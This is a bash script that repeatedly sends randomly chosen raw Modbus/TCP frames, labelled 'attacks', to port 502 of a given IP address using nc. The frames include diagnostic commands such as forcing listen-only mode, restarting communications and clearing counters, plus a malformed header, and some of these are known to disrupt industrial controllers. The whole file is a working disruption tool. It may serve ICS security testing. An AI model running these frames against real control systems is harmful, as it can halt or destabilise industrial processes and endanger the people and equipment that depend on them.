! /usr/bin/env bash

[ -z "$1" ] && { echo "Usage: $(basename $0) <modbus_slave_ip_address>"; exit 1; }

declare -a attacks

attacks=(
    '\x00\x01\x00\x00\x00\x06\x01\x08\x00\x0A'
    '\x00\x01\x00\x00\x00\x06\x01\x08\x00\x04'
    '\x00\x01\x00\x00\x00\x06\x01\x2B'
    '\x00\x01\x00\x00\x00\x06\x01\x11'
    '\x00\x01\x00\x00\x00\x06\x01\x08\x00\x01'
    '\x00\x01\x00\x00\x00\x05\x01\x5a\x00\x03\x00'
    '\x00\x01\x00\x00\x20\x20\x00\x00\x00\x00\x00\x00'
)

while :
do
    i=$((RANDOM%${#attacks[@]}))
    echo "i=$i, payload='${attacks[${i}]}'"
    echo -n -e "${attacks[$i]}" | nc -w 1 ${1} 502
    sleep 2
done

    

